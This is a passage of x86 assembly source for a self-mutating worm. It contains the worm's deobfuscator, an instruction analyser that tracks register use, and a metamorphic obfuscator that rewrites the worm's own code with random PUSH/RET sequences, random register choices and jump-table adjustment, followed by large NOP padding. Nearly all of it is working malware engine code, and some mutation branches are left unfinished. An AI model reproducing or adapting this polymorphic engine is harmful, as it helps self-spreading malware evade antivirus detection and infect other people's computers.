		    mov al, byte[esi]
		    mov byte[edi], al
		    inc esi
		    inc edi
		    inc ecx
		    setnumber ebx, lDeobfuscator_WroteInstr, 1
		    jmp dword[ebx]

		DeobfuscateFoundPUSH_RET:
		    dec edi		  ; PUSH Reg32 away
		    addnumber esi, 11, 1
		    mov al, byte[esi]
		    mov byte[edi], al
		    inc esi
		    inc edi
		    mov al, byte[esi]
		    push eax
		    setnumber eax, lDeobfuscateFoundPUSH_RET_FinWrite, 1
		    mov ebp, dword[eax]
		    pop eax
		    push eax
		    inc al
		    cmp al, 0x91
		    pop eax
		    jne OverDObf21
		    jmp ebp
		    OverDObf21:

		    mov byte[edi], al
		    inc edi

		  DeobfuscateFoundPUSH_RET_FinWrite:
		    addnumber esi, 5, 1 	  ; 1 (from before)+11+1+5=18
		    addnumber ecx, 17, 1

	Deobfuscator_WroteInstr:
	push eax
	    setnumber eax, lDeobfuscateMore, 1
	    mov ebp, dword[eax]
	    setnumber eax, FileCodeSize, 1
	    mov ebx, dword[eax]
	    setnumber eax, l2endcode, 1
	    mov eax, dword[eax]
	    sub ebx, eax
	    setnumber eax, lendcode, 1
	    mov eax, dword[eax]
	    add ebx, eax
	pop eax
	cmp ecx, ebx
	jnb OverDObf22
    jmp ebp
    OverDObf22:
	xor ecx, ecx
	DeobfuscateWriteMore:
		mov al, byte[esi]
		mov byte[edi], al
		inc esi
		inc edi
		inc ecx
	push eax
	    setnumber eax, lDeobfuscateWriteMore, 1
	    mov ebp, dword[eax]
	    setnumber ebx, (absend-endcode), 1

	    setnumber eax, l2endcode, 1
	    mov eax, dword[eax]
	    add ebx, eax
	    setnumber eax, lendcode, 1
	    mov eax, dword[eax]
	    sub ebx, eax
	pop eax
	cmp ecx, ebx
	jnb OverDeObf23
	jmp  ebp
	OverDeObf23:



;        setnumber eax, WormCodeStart, 0
;        mov       esi, dword[eax]

;        setnumber eax, VA_BlankCode, 0
;        mov       edi, dword[eax]

;        setnumber eax, FileCodeSize, 0
;        mov       ecx, dword[eax]
;        rep movsb



;;;
;;; Deobfuscator
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;; Code-Analyser
;;;

	setnumber esi, l2ConstJmpTableStart, 0
	setnumber edi, WormDataStart, 0
	mov edi, dword[edi]
	addnumber edi, (lVariableJmpTableStart-DataStart), 0
	setnumber ecx, (lVariableJmpTableEnd-lVariableJmpTableStart), 1
	rep	  movsb

	xor	ecx, ecx	 ; Byte counter
	xor	edx, edx	 ; integer counter




	AnalyseFileCode:
		setnumber esi, VA_BlankCode, 1
		mov esi, dword[esi]
		add	esi, ecx		     ; ESI=pointer to blank code

		xor	ebx, ebx
		setnumber eax, WatchFlags, 1
		mov	bl, byte[eax]


		setnumber eax, VA_Registers, 1
		mov	eax, dword[eax]
		add	eax, edx
		mov	byte[eax], bl

		setnumber eax, InstrRestriction, 1
		mov	eax, dword[eax]
		add	eax, edx

		push ebx
		    xor     ebx, ebx
		    mov     byte[eax], bl
		pop ebx

		setnumber eax, VA_CodeSize, 1
		mov	eax, dword[eax]
		add	eax, edx
		push ebx
		    setnumber ebx, 2, 1
		    mov     dword[eax], ebx
		pop ebx

		setnumber eax, lAnalyseGotCmpRegReg, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		and al, 1111'1101b
		cmp al, 0011'1001b	     ; cmp Reg32, Reg32 || cmp Reg32, dword[Reg32]
		jne OverAFC1
		jmp ebp
		OverAFC1:

		setnumber eax, lAnalyseGotCmpReg8Reg8, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		cmp al, 0011'1000b	     ; cmp Reg8, Reg8
		jne OverAFCF2
		jmp ebp
		OverAFCF2:

		setnumber eax, lAnalyseGotDoubleReg8Reg32, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		and al, 1111'1101b
		cmp al, 1000'1000b	     ; mov Reg8,byte[Reg32] || mov byte[Reg32],Reg8
		jne OverAFCF6
		jmp ebp
		OverAFCF6:

		setnumber eax, lAnalyseGotDoubleRegReg, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		and al, 1100'0111b
		cmp al, 1		     ; op Reg32,Reg32
		jne OverAFCF3
		jmp ebp
		OverAFCF3:

		mov al, byte[esi]
		and al, 1111'1101b
		cmp al, 1000'1001b	     ; mov Reg32, Reg32 || mov dword[Reg32], Reg32 || mov Reg32, dword[Reg32]
		jne OverAFC3
		jmp ebp
		OverAFC3:

		mov al, byte[esi]
		and al, 1111'1101b
		cmp al, 0000'0001b	     ; add Reg32, Reg32 || add Reg32, dword[Reg32] || add dword[Reg32], Reg32
		jne OverAFC4
		jmp ebp
		OverAFC4:



		setnumber eax, lAnalyseGotDoubleReg8Reg32, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		and al, 1101'0101b
		cmp al, 0000'0000b	     ; (add|sub|or|and) Reg8, byte[Reg32]
		jne OverAFC6
		jmp ebp
		OverAFC6:

		mov al, byte[esi]
		cmp al, 0x32		     ; xor Reg8, byte[Reg32]
		jne OverAFC7
		jmp ebp
		OverAFC7:


		setnumber eax, lAnalyseGotDouble___Reg8, 1
		mov ebp, dword[eax]
		xor ebx, ebx		       ; Nothing in 1st Register
		mov al, byte[esi]
		cmp al, 0xFE		     ; inc Reg8 || dec Reg8
		jne OverAFC8
		jmp ebp
		OverAFC8:

		setnumber eax, lAnalyseGotDouble___Reg, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		setnumber ebx, 0000'0010b, 1
		cmp al, 0xD3		     ; shl Reg32, cl || shr Reg32, cl
		jne OverAFC9
		jmp ebp
		OverAFC9:

		setnumber ebx, 0000'0101b, 1	       ; EAX and EDX
		mov al, byte[esi]
		cmp al, 0xF7		     ; mul Reg32 || div Reg32
		jne OverAFC10
		jmp ebp
		OverAFC10:

		setnumber eax, InstrRestriction, 1
		mov	eax, dword[eax]
		add	eax, edx
		push ebx
		    setnumber ebx, 1, 1
		    mov       byte[eax], bl
		pop ebx

		xor ebx, ebx		       ; Nothing in 1st Register
		mov al, byte[esi]
		cmp al, 0xFF		     ; jmp dword[Reg32]
		jne OverAFC11
		jmp ebp
		OverAFC11:


		setnumber eax, lAnalyseGotJxx, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		and al, 1111'1000b
		cmp al, 0111'0000b	     ; some Jxx
		jne OverAFC12
		jmp ebp
		OverAFC12:

		setnumber eax, lAnalyseGotInstrFin, 1
		mov ebp, dword[eax]
		mov al, byte[esi]	     ; push NN
		cmp al, 0x6A
		jne OverAFC13
		jmp ebp
		OverAFC13:

		setnumber eax, InstrRestriction, 1
		mov	eax, dword[eax]
		add	eax, edx
		push ebx
		    xor ebx, ebx
		    mov     byte[eax], bl
		pop ebx

		setnumber eax, lAnalyseGotInstrFin, 1
		mov ebp, dword[eax]
		mov al, byte[esi]
		setnumber ebx, 1, 1		       ; eax!
		and al, 1110'0111b
		cmp al, 0010'0100b	     ; (and|xor|sub|cmp) al, Imm
		jne OverAFCF1
		jmp ebp
		OverAFCF1:

		setnumber eax, InstrRestriction, 1
		mov	eax, dword[eax]
		add	eax, edx
		push ebx
		    setnumber ebx, 1, 1
		    mov     byte[eax], bl
		pop ebx

		xor	ebx, ebx	     ; no restr.
		setnumber eax, VA_CodeSize, 1
		mov	eax, dword[eax]
		add	eax, edx
		push ebx
		    setnumber ebx, 1, 1
		    mov     dword[eax], ebx
		pop ebx


		mov al, byte[esi]	     ; pushad / popad
		and al, 1111'1110b
		cmp al, 0110'0000b
		jne OverAFC14
		jmp ebp
		OverAFC14:

		mov al, byte[esi]	     ; retn
		cmp al, 0xC3
		jne OverAFC15
		jmp ebp
		OverAFC15:


		setnumber eax, lAnalyseGotSingleByteFindReg, 1
		mov ebp, dword[eax]
		mov al, byte[esi]	     ; push/pop Reg32
		and al, 1111'0000b
		cmp al, 0101'0000b
		jne OverAFC16
		jmp ebp
		OverAFC16:

		setnumber eax, InstrRestriction, 1
		mov	eax, dword[eax]
		add	eax, edx
		push ebx
		    xor ebx, ebx
		    mov     byte[eax], bl
		pop ebx

		mov al, byte[esi]	     ; inc/dec Reg32
		and al, 1111'0000b
		cmp al, 0100'0000b
		jne OverAFC17
		jmp ebp
		OverAFC17:

		setnumber eax, lAnalyseGotInstrFin, 1
		mov ebp, dword[eax]
		mov al, byte[esi]	     ; int3
		cmp al, 0xCC
		jne OverAFC18
		jmp ebp
		OverAFC18:

					       ; should be last entry!!

		setnumber eax, VA_CodeSize, 1
		mov	eax, dword[eax]
		add	eax, edx
		push ebx
		    setnumber ebx, 2, 1
		    mov     dword[eax], ebx
		pop ebx

		setnumber eax, VA_Registers, 1
		mov	eax, dword[eax]
		add	eax, edx

		push	0110'0000b	     ; ESI & EDI
		pop	ebx
		or	byte[eax], bl
		setnumber ebx, 0x2, 1		  ; ECX

		mov al, byte[esi]	     ; REP MOVSB
		cmp al, 0xF3
		jne OverAFC19
		jmp ebp
		OverAFC19:


		pushad
;                invoke MessageBox, 0x0, a, a, 0x0
		 int3	; 3xint3
		 int3
		 int3
		popad

		      pushad
			    setnumber eax, VA_Registers, 1
			    mov     ebx, dword[eax]
			    add     ebx, edx
			    mov     al, byte[ebx]
			    setnumber eax, VA_CodeSize, 1
			    mov     ebx, dword[eax]
			    add     ebx, edx
			    mov     ah, byte[ebx]
			    mov     bl, byte[esi]
			    int3
		      popad


		AnalyseGotJxx:
		    setnumber eax, WatchFlags, 1
		    push ebx
			xor ebx, ebx
			mov byte[eax], bl
		    pop ebx
		    setnumber eax, lAnalyseGotInstrFin, 1
		    jmp       dword[eax]

		AnalyseGotSingleByteFindReg:
		    setnumber eax, lAnalyseGotInstrFin, 1
		    mov   ebp, dword[eax]
		    mov   al, byte[esi]
		    setnumber ebx, lGetRegisterCode, 1
		    jmp   dword[ebx]

		AnalyseGotCmpReg8Reg8:
		    setnumber eax, WatchFlags, 1
		    push ebx
			setnumber ebx,	1000'0000b, 1
			mov	byte[eax], bl
		    pop ebx

		    setnumber eax, VA_Registers, 1
		    mov     eax, dword[eax]
		    add     eax, edx
		    push    ebx
			setnumber ebx, 1000'0000b, 1
			mov	byte[eax], bl	; Save Flag
		    pop     ebx

		AnalyseGotDoubleReg8Reg8:
		    setnumber eax, lAnalyseGotDouble___Reg8, 1
		    mov   ebp, dword[eax]
		    xor   eax, eax
		    inc   esi
		    mov   al,  byte[esi]
		    dec   esi
		    push  ecx
			setnumber ecx, 3, 1
			shr   eax, cl
		    pop  ecx
		    setnumber ebx, lGetRegisterCode8, 1
		    jmp   dword[ebx]

		AnalyseGotDouble___Reg8:
		    setnumber eax, lAnalyseGotInstrFin, 1
		    mov   ebp, dword[eax]
		    setnumber eax, VA_Registers, 1
		    mov     eax, dword[eax]
		    add     eax, edx
		    or	    byte[eax], bl

		    inc     esi
		    mov     al, byte[esi]
		    dec     esi
		    setnumber ebx, lGetRegisterCode8, 1
		    jmp   dword[ebx]

		AnalyseGotDoubleReg8Reg32:
		    setnumber eax, lAnalyseGotDouble___Reg, 1
		    mov   ebp, dword[eax]
		    xor   eax, eax
		    inc   esi
		    mov   al,  byte[esi]
		    dec   esi
		    push  ecx
			setnumber ecx, 3, 1
			shr   eax, cl
		    pop  ecx
		    setnumber ebx, lGetRegisterCode8, 1
		    jmp   dword[ebx]

		AnalyseGotCmpRegReg:
		    setnumber eax, WatchFlags, 1
		    push    ebx
			setnumber ebx, 1000'0000b, 1
			mov	byte[eax], bl
			setnumber eax, VA_Registers, 1
			mov	eax, dword[eax]
			add	eax, edx
			mov	byte[eax], bl  ; Save Flag
		    pop     ebx



		AnalyseGotDoubleRegReg:
		    setnumber eax, lAnalyseGotDouble___Reg, 1
		    mov   ebp, dword[eax]
		    xor   eax, eax
		    inc   esi
		    mov   al,  byte[esi]
		    dec   esi
		    push  ecx
			setnumber ecx, 3, 1
			shr   eax, cl
		    pop   ecx

		    setnumber ebx, lGetRegisterCode, 1
		    jmp   dword[ebx]


		AnalyseGotDouble___Reg:
		    setnumber eax, lAnalyseGotInstrFin, 1
		    mov     ebp, dword[eax]
		    setnumber eax, VA_Registers, 1
		    mov     eax, dword[eax]
		    add     eax, edx
		    or	    byte[eax], bl
		    inc     esi
		    mov     al, byte[esi]
		    dec     esi

		    setnumber ebx, lGetRegisterCode, 1
		    jmp   dword[ebx]

		AnalyseGotInstrFin:
			setnumber eax, VA_Registers, 1
			mov	eax, dword[eax]
			add	eax, edx
			or	byte[eax], bl

			setnumber eax, VA_CodeSize, 1
			mov   eax, dword[eax]
			add   eax, edx

			add   ecx, dword[eax]

		      pushad
			    setnumber eax, VA_Registers, 1
			    mov     ebx, dword[eax]
			    add     ebx, edx
			    mov     al, byte[ebx]
			    setnumber eax, InstrRestriction, 1
			    mov     ebx, dword[eax]
			    add     ebx, edx
			    mov     ah, byte[ebx]
			    mov     cl, byte[esi]
;                           int3
		      popad

			inc	edx
	     push  eax
		 setnumber eax, lAnalyseFileCode, 1
		 mov	   ebp, dword[eax]
		 setnumber eax, FileCodeSize, 1
		 cmp	   ecx, dword[eax]
	     pop  eax
	jnb OverAFC20
	jmp ebp
	OverAFC20:

;        invoke  MessageBox, 0x0, b, b, 0x0
;        int3

;;;
;;; Code-Analyser
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;
;;; Obfuscator
;;;

	setnumber eax, VA_BlankCode, 0
	mov	esi, dword[eax] 	     ; Counter in BlankCode
	setnumber eax, WormCodeStart, 0
	mov	edi, dword[eax] 	     ; Counter in new Code
	xor	ebp, ebp		     ; integer++ Counter

	MutateNextInstruction:
		setnumber eax, lGetRandomNumber, 1
		call dword[eax]
		setnumber ebx, RandomNumber, 1
		xor  eax, eax
		mov  al, byte[ebx]
		and  al, 0011'0000b
		setnumber ebx, lNoMutate, 1
		cmp  al, 0x0
		je   OverObf1
		jmp  dword[ebx]
		OverObf1:

		setnumber ebx, lMutationWithJmp, 1
		setnumber eax, InstrRestriction, 1
		mov  eax, dword[eax]
		add  eax, ebp
		mov  al, byte[eax]
		and  al, 0000'0001b
		push ebx
		    xor  ebx, ebx
		    cmp  al, bl
		pop  ebx
		je   OverObf2
		jmp  dword[ebx]
		OverObf2:

	    MutationWithPush:
		; push fin
		; push instr+1
		; instr: mov Reg, 0xNN'NN'NN'NN    - where one of the NN is C3=RET
		; ret
		; fin:

		push ebp
		    setnumber eax, lGetRandomRegister, 1
		    call dword[eax]
		pop  ebp

		push ebx		       ; Save Random Register

		setnumber eax, 0x50, 1	       ; write PUSH REG
		add  eax, ebx
		mov  byte[edi], al
		inc  edi

		setnumber eax, 0x68, 1
		mov  byte[edi], al	       ; write PUSH opcode
		mov  eax, edi
		push ebx
		    setnumber ebx, WormCodeStart, 1
		    mov  ebx, dword[ebx]
		    sub  eax, ebx
		pop  ebx
		addnumber  eax, (CodeStartInMemory+16), 1
		inc  edi
		mov  dword[edi], eax	       ; write addresse over ret
		addnumber edi, 4, 1
		push eax
		    setnumber eax, 0x68, 1
		    mov  byte[edi], al		 ; write 2nd PUSH
		pop  eax
		inc  edi
		push ebx
		     setnumber ebx, 5, 1
		     sub eax, ebx
		pop  ebx
		mov  dword[edi], eax	       ; write addresse of instruction in MOV instruction
		addnumber edi, 4, 1

		pop  ebx
		push ebx

		addnumber  ebx, 0xB8, 1
		mov  byte[edi], bl	       ; write MOV
		inc  edi

		xor ecx, ecx
		setnumber eax, VA_CodeSize, 1
		mov eax, dword[eax]
		add eax, ebp
		mov cl, byte[eax]
		push ecx
		rep movsb		       ; write one instruction

		pop  ecx
		setnumber eax, 3, 1
		sub eax, ecx
		mov ecx, eax		       ; ecx=4-1-InstrSize

		push esi
			setnumber esi, NopTmp, 1
			rep movsb	       ; write NOP padding
		pop  esi

		setnumber ebx, 0xC3, 1
		mov  byte[edi], bl	     ; write RETN
		inc  edi
		mov  byte[edi], bl	     ; write RETN
		inc  edi

		pop  ebx
		addnumber ebx, 0x58, 1		       ; write POP REG
		mov  byte[edi], bl
		inc  edi

		xor ecx, ecx
		setnumber eax, VA_CodeSize, 1
		mov eax, dword[eax]
		add eax, ebp
		mov cl, byte[eax]

		setnumber eax, 18, 1
		sub eax, ecx			; 18-size of instruction
		setnumber ebx, lAdjustJumpTable, 1
		call dword[ebx]

		setnumber ebx, lFinishedThisInstruction, 1
		jmp  dword[ebx]


	    MutationWithJmp:

	    NoMutate:
		setnumber eax, VA_CodeSize, 1
		mov eax, dword[eax]
		add eax, ebp
		xor ecx, ecx
		mov cl, byte[eax]
		rep movsb


		FinishedThisInstruction:
		setnumber ebx, lMutateNextInstruction, 1
		inc	ebp
		setnumber eax, FileCodeSize, 1
		mov	eax, dword[eax]
		push ebx
		     setnumber ebx, VA_BlankCode, 1
		     mov       ebx, dword[ebx]
		     add       eax, ebx
		pop  ebx
		cmp	esi, eax
	jnb OverObf3
	jmp dword[ebx]
	OverObf3:

	xor ecx, ecx
	setnumber ebx, lObfuscatorWriteMoreUnObfuscatedCode, 1
	setnumber ebp, (absend-endcode), 1
	ObfuscatorWriteMoreUnObfuscatedCode:
	    mov al, byte[esi]
	    mov byte[edi], al
	    inc esi
	    inc edi
	    inc ecx
	cmp ecx, ebp
	jnb OverObf4
	jmp dword[ebx]
	OverObf4:


;        invoke  MessageBox, 0x0, e, e, 0x0

;;;
;;; Obfuscator
;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	setnumber eax, lCloseRandomFile, 0
	call dword[eax]

ret


; #####
; #####   Mutate File :)))
; #####
; ###########################################################################
; ###########################################################################


GetRandomRegister:
;int3
    setnumber eax, lGetRandomNumber, 0
    call dword[eax]
    setnumber ecx, RandomNumber, 1
    mov al, byte[ecx]
    and al, 7		    ; 0000'0111
    setnumber ecx, lGetRandomRegister, 1
    cmp  al, 7
    jne  OverGRR1
    jmp   dword[ecx]
    OverGRR1:

    mov ecx, eax
    setnumber eax, 1, 1
    shl eax, cl

    push edx
    setnumber ebx, VA_Registers, 0
    mov  edx, dword[ebx]
    add  edx, ebp
    xor  ebx, ebx
    mov  bl,  byte[edx]
    pop  edx
    and  ebx, eax

    setnumber  ecx, lGetRandomRegister, 1
    push edx
    xor edx, edx

    cmp  bl, dl
    pop  edx
    je	 OverGRR2
    jmp  dword[ecx]
    OverGRR2:

    push eax
	setnumber eax, lEndGetRandomRegister, 0
	mov ebp, dword[eax]
    pop eax

    setnumber ecx, lGetRegisterCodeInv, 1
    jmp dword[ecx]     ; bl=register code

    EndGetRandomRegister:
ret



GetRegisterCode:
; ebp -> JmpValue
; al  -> RegisterCode
; bl  -> Byte
     push ecx
		setnumber ecx, lEndGetRegisterCode, 1
		and   al, 0000'0111b

		setnumber   ebx, 0000'0001b, 1	      ; EAX
		cmp   al, 0000'0000b
		jne   OverGRC1
		jmp   dword[ecx]
		OverGRC1:

		setnumber   ebx, 0000'0010b, 1	      ; ECX
		cmp   al, 0000'0001b
		jne   OverGRC2
		jmp   dword[ecx]
		OverGRC2:

		setnumber   ebx, 0000'0100b, 1	      ; EDX
		cmp   al, 0000'0010b
		jne   OverGRC3
		jmp   dword[ecx]
		OverGRC3:

		setnumber   ebx, 0000'1000b, 1	      ; EBX
		cmp   al, 0000'0011b
		jne   OverGRC4
		jmp   dword[ecx]
		OverGRC4:

		setnumber   ebx, 0001'0000b, 1	      ; EBP
		cmp   al, 0000'0101b
		jne   OverGRC5
		jmp   dword[ecx]
		OverGRC5:

		setnumber   ebx, 0010'0000b, 1	      ; ESI
		cmp   al, 0000'0110b
		jne   OverGRC6
		jmp   dword[ecx]
		OverGRC6:

		setnumber   ebx, 0100'0000b, 1	      ; EDI
		cmp   al, 0000'0111b
		jne   OverGRC7
		jmp   dword[ecx]
		OverGRC7:

		int3

    EndGetRegisterCode:
    pop ecx
jmp    ebp


GetRegisterCode8:
; ebp -> JmpValue
; al  -> RegisterCode
; bl  -> Byte
     push ecx
		setnumber ecx, lEndGetRegisterCode8, 1
		and   al, 0000'0111b

		setnumber ebx, 0000'0001b, 1	    ; AL
		cmp   al, 0000'0000b
		jne   OverGRC81
		jmp   dword[ecx]
		OverGRC81:

		setnumber   ebx, 0000'0010b, 1	      ; CL
		cmp   al, 0000'0001b
		jne   OverGRC82
		jmp   dword[ecx]
		OverGRC82:

		setnumber   ebx, 0000'0100b, 1	      ; DL
		cmp   al, 0000'0010b
		jne   OverGRC83
		jmp   dword[ecx]
		OverGRC83:

		setnumber   ebx, 0000'1000b, 1	      ; BL
		cmp   al, 0000'0011b
		jne   OverGRC84
		jmp   dword[ecx]
		OverGRC84:


		setnumber   ebx, 0000'0001b, 1	      ; AH
		cmp   al, 0000'0100b
		jne   OverGRC85
		jmp   dword[ecx]
		OverGRC85:

		setnumber   ebx, 0000'0010b, 1	      ; CH
		cmp   al, 0000'0101b
		jne   OverGRC86
		jmp   dword[ecx]
		OverGRC86:

		setnumber   ebx, 0000'0100b, 1	      ; DH
		cmp   al, 0000'0110b
		jne   OverGRC87
		jmp   dword[ecx]
		OverGRC87:

		setnumber   ebx, 0000'1000b, 1	      ; BH
		cmp   al, 0000'0111b
		jne   OverGRC88
		jmp   dword[ecx]
		OverGRC88:

		int3

    EndGetRegisterCode8:
    pop ecx
jmp    ebp




GetRegisterCodeInv:
; In:
;     ebp -> JmpValue
;     al  -> Byte
;
; Out:
;      bl  -> RegisterCode

    push ecx
    setnumber ecx, lEndReturnRegisterCode, 1

		setnumber   ebx, 0000'0000b, 1	      ; EAX
		cmp   al, 0000'0001b
		jne   OverGRCI1
		jmp   dword[ecx]
		OverGRCI1:

		setnumber   ebx, 0000'0001b, 1	      ; ECX
		cmp   al, 0000'0010b
		jne   OverGRCI2
		jmp   dword[ecx]
		OverGRCI2:

		setnumber   ebx, 0000'0010b, 1	      ; EDX
		cmp   al, 0000'0100b
		jne   OverGRCI3
		jmp   dword[ecx]
		OverGRCI3:

		setnumber   ebx, 0000'0011b, 1	      ; EBX
		cmp   al, 0000'1000b
		jne   OverGRCI4
		jmp   dword[ecx]
		OverGRCI4:

		setnumber   ebx, 0000'0101b, 1	      ; EBP
		cmp   al, 0001'0000b
		jne   OverGRCI5
		jmp   dword[ecx]
		OverGRCI5:

		setnumber   ebx, 0000'0110b, 1	      ; ESI
		cmp   al, 0010'0000b
		jne   OverGRCI6
		jmp   dword[ecx]
		OverGRCI6:

		setnumber   ebx, 0000'0111b, 1	      ; EDI
		cmp   al, 0100'0000b
		jne   OverGRCI7
		jmp   dword[ecx]
		OverGRCI7:

		int3

    EndReturnRegisterCode:
    pop ecx
jmp    ebp


AdjustJumpTable:
	pushad

	push	eax	 ; xchg eax, ebp
	push	ebp	 ; i prefere to keep the reduced instruction set :)
	pop	eax
	pop	ebp

	push eax
	    setnumber eax, VA_BlankCode, 1
	    mov eax, dword[eax]
	    sub     esi, eax
	pop eax

	setnumber ebx, WormDataStart, 1
	mov	  ebx, dword[ebx]
	addnumber ebx, (lVariableJmpTableStart-DataStart), 1

	setnumber eax, WormDataStart, 1
	mov	  eax, dword[eax]
	addnumber eax, (l2ConstJmpTableStart-DataStart), 1

	xor	ecx, ecx
	AdjustJumpTableNextAddress:
		mov	edx, dword[eax]
		push eax
		    setnumber eax, CodeStartInMemory, 1
		    sub     edx, eax	      ; Addresse of instruction in VariableTable without Offset
		pop eax
		setnumber edi, lAdjustJumpTable_NoAdjust, 1
		cmp	edx, esi
		jnb	OverAJT1
		jmp	dword[edi]
		OverAJT1:

		add	dword[ebx], ebp

		AdjustJumpTable_NoAdjust:
		setnumber edi, lAdjustJumpTableNextAddress, 1
		addnumber ebx, 4, 1
		addnumber eax, 4, 1
		addnumber ecx, 4, 1
		push eax
		setnumber eax, (lVariableJmpTableEnd-lVariableJmpTableStart), 1
		cmp	ecx, eax
		pop  eax
	jnb	OverAJT2
	jmp	dword[edi]
	OverAJT2:
	popad
ret

endcode:
; #####
; #####   Mutate File :)))
; #####
; ###########################################################################
; ###########################################################################


times 50'000 db 0x90
absend:
times 50'000 db 0x90

;endcode:
.end start
